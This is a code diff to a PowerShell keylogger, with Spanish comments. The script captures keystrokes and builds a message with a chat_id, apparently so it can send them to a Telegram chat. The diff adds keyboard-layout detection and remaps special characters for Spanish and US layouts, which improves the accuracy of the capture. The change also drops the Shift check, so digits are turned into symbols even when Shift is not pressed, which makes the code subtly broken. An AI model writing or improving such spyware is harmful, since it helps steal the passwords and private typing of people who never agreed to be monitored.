@@ -20,6 +20,11 @@ Function Get-IP {
     return $ip
 }
 
+Function Get-KeyboardLayout {
+    $langID = [System.Windows.Forms.InputLanguage]::CurrentInputLanguage.Culture.Name
+    return $langID
+}
+
 Function KeyCapture {
     $MessageToSend = New-Object psobject
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chatID
@@ -31,7 +36,10 @@ Function KeyCapture {
     $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
     $KeypressThreshold = [TimeSpan]::FromSeconds(10)
     $capturedKeys = ""
-    
+
+    # Detectar la distribución del teclado
+    $keyboardLayout = Get-KeyboardLayout
+
     While ($true) {
         $keyPressed = $false
         try {
@@ -53,15 +61,21 @@ Function KeyCapture {
                         if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                             $LString = $logchar.ToString()
 
-                            # Si Shift está presionado, el código de la tecla puede generar caracteres especiales
-                            if ($shiftPressed) {
-                                # Aquí se ajustan los caracteres especiales cuando Shift está presionado
+                            # Dependiendo del layout de teclado, ajustamos caracteres especiales
+                            if ($keyboardLayout -eq "es-ES") {  # Español
                                 if ($asc -eq 50) { $LString = "@" }
                                 elseif ($asc -eq 56) { $LString = "*" }
                                 elseif ($asc -eq 49) { $LString = "!" }
                                 elseif ($asc -eq 51) { $LString = "#" }
                                 elseif ($asc -eq 52) { $LString = "$" }
-                                # Otros caracteres especiales
+                                # Aquí puedes agregar más caracteres si es necesario
+                            }
+                            elseif ($keyboardLayout -eq "en-US") {  # Inglés
+                                if ($asc -eq 50) { $LString = "@" }
+                                elseif ($asc -eq 51) { $LString = "#" }
+                                elseif ($asc -eq 52) { $LString = "$" }
+                                elseif ($asc -eq 53) { $LString = "%" }
+                                # Aquí puedes agregar más caracteres si es necesario
                             }
 
                             # Actualizamos el texto capturado con la tecla actual
